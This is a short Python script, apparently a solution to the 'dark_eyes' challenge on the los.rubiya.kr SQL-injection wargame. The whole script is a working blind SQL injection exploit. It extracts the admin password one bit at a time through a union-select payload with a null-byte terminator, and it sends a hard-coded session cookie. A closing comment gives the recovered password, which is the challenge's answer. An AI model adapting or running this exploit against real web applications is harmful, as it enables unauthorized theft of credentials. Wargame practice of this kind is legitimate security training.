import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	loop_count=8
	for i in range(1,loop_count+1):
		print("progress : " + str(i))
		word=""
		for j in range(1, 9):
			URL="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select 1 union select (substr(lpad(bin(ord(substr(pw,"+str(i)+",1))),8,'0'),"+str(j)+",1)=1));%00"
			response = requests.get(URL, cookies=cookies)
			if "query : " in response.text:
				word+=str(1)
			else:
				word+=str(0)
			print("current word : "+ str(word))

		password+=chr(int(word,2))
		print("current password : " + password)

	print("admin's Password : " + password)
	
if __name__ == "__main__":
	print("Start Program")
	blindi()
	# password : 5a2f5d3c
